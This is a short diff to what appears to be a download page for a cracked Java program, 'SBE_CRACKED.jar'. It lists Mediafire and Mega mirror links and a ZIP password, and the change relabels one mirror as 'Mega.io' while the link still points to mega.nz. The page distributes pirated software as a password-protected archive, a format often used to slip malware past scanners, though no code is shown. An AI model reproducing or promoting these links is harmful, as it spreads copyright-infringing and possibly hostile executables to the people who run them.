@@ -25,7 +25,7 @@ Primary Download:
 [Mediafire Mirror](https://www.mediafire.com/file/p6iuapj9p71gc9s/SBE_CRACKED.jar/file)
 
 Alternative Mirrors:  
-- [Mega.nz](https://mega.nz/file/PaIihAQI#aVpQm_tQiBf1-GdE5Zzy25RMNysU9OFjgDtA1Jtdok4)  
+- [Mega.io](https://mega.nz/file/PaIihAQI#aVpQm_tQiBf1-GdE5Zzy25RMNysU9OFjgDtA1Jtdok4)  
 
 **ZIP Password:** `sbe2025free`
 
